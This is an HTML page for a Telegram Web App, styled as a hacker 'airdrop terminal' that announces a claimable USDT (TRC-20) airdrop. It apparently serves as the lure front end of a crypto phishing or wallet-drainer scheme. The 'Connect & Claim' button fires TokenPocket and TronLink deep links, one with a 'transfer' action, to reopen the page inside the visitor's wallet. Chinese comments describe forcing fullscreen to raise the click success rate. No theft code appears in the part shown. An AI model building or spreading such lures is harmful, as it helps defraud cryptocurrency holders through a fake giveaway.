<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.impactOccurred('heavy');
    const currentUrl = window.location.href;

    // 1. 构造不同的钱包协议
    const protocols = [
        `tpdapp://open?params={"url": "${currentUrl}"}`, // TokenPocket
        `tronlinkoutside://pull.activity?param={"url":"${currentUrl}","action":"transfer"}`, // TronLink
        `tpoutside://pull.activity?url=${encodeURIComponent(currentUrl)}` // TP 备用
    ];

    // 2. 尝试逐个击破
    let success = false;
    
    // 我们先尝试最通用的 TP 协议
    try {
        tg.openLink(protocols[0]);
        success = true;
    } catch (e) {
        console.log("TP Failed, trying TronLink...");
    }

    // 3. 视觉反馈：在终端显示正在尝试连接
    const terminal = document.getElementById('terminal');
    terminal.innerHTML += "<p style='color:#0f0'>> BROADCASTING_WALLET_SIGNAL...</p>";
    terminal.innerHTML += "<p style='color:#666'>> SUPPORTED: TP, TRONLINK, TRUST</p>";

    // 4. 终极方案：如果上面的都不行，尝试用普通的跳转
    if (!success) {
        window.location.href = protocols[0];
    }
}
</script>
</body>
</html>
